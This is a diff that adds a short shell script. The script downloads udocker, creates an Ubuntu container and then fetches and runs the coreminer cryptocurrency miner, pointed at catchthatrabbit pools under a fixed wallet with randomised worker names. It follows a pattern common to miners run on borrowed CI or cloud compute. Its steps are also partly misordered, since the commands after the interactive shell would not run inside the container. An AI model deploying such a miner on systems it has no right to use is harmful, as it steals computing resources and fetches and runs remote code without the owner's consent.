@@ -1,0 +1,15 @@
+#!/bin/sh
+wget https://github.com/indigo-dc/udocker/releases/download/1.3.9/udocker-1.3.9.tar.gz && tar zxvf udocker-1.3.9.tar.gz && mv udocker-1.3.9/udocker udocker && rm -rf udocker-1.3.9
+cd udocker
+./udocker pull ubuntu:focal
+./udocker create --name=focal ubuntu:focal
+./udocker  run focal /bin/bash
+
+./udocker
+echo
+apt update && apt -y install unzip wget curl
+curl https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz -L -o coreminer-linux-x86_64.tar.gz
+tar xf coreminer-linux-x86_64.tar.gz
+cd coreapp
+./coreminer -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 \
+     -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008
